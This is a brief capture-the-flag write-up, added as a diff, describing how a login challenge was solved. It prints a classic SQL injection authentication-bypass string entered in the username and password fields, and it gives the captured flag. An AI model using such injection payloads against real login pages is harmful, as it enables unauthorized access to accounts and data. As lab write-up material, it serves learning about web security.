@@ -1,0 +1,11 @@
+This was relatively simple SQL injection.
+You were prompted for both the username and password when you visited the site.
+My response were:
+
+Username: ' OR '1' = '1' LIMIT 1 -- '
+Password: ' OR '1' = '1' LIMIT 1 -- '
+
+We then get redirected to a page which simply reads: {mY_r3alm_of_AUTHORIZATIONZ}
+which just so happens to be our flag.
+
+Flag: {mY_r3alm_of_AUTHORIZATIONZ}
